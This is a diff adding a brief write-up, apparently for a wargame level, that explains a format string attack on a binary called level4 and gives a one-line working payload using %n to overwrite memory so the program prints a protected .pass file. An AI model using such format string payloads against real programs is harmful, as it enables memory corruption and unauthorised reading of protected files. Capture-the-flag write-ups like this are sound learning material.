@@ -1,0 +1,5 @@
+I mean, it's literally the exact same exploit as level3, so I'm not going to
+overextend. The only difference is that the value compared is much much bigger,
+and system directly calls a cat on .pass instead of opening a shell.
+
+Exploit: python -c 'print "\x10\x98\x04\x08%16930112x%12$n"' | ./level4
